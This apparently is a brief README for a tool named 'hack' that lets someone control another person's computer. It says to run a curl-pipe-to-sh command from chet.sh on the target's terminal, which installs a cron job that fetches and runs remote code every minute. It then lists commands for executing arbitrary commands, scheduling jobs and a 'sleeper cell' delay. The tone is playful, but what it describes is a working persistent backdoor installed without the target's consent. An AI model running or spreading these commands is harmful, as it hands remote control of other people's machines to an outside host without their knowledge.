# Hack

Start hacking someone by running this command from their Terminal: `curl https://chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl https://chet.sh/live | sh`.

Now go to your commandline and we can start having some fun.

```
hack live exec "say hello world"
hack live interval 1y # sleeper cell
hack live cron "20 16 * * * * -- say 'its foe 20, ye better be toke-in'"
hack live reset
hack live forget
hack live rename jon
hack jon ...
```
